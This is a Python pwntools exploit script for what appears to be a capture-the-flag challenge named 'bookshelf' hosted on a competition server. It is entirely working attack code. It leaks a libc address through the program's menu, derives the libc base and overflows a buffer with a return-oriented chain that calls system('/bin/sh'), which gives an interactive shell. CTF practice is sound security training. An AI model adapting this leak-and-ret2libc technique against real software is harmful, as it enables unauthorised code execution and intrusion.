from pwn import *
elf = context.binary = ELF("./bookshelf_patched")
libc = ELF("./libc.so.6")
r = elf.process()
r = remote("chal.pctf.competitivecyber.club", 4444)
# gdb.attach(r, '''
#     b* adminBook + 92\n
#     b* adminBook + 114\n
#     c
# ''')

def opt2():
    r.sendline(str(2))
    r.sendline(str(2))
    r.sendline(b"y")

##Leak Libc
for i in range(10):
    opt2()
r.sendline(str(2))
r.sendline(str(3))
r.recvuntil(b"0x", drop = True)
puts_leak = int(r.recv(12),16)
log.success(f"PUTS_leak: {hex(puts_leak)}")
r.sendline(b"y")
libc.address = puts_leak - 528080
r.sendline(str(1))
r.sendline(b"y")
r.sendline(b"1" * 39)
r.send(b"\n")
r.sendline(str(3))
pop_rdi = 0x000000000002a3e5 + libc.address
ret = pop_rdi+1
payload = p64(0x404000)*7 + p64(ret) + p64(pop_rdi) + p64(next(libc.search(b"/bin/sh"))) + p64(libc.sym["system"]) 
r.sendline(payload)
r.interactive()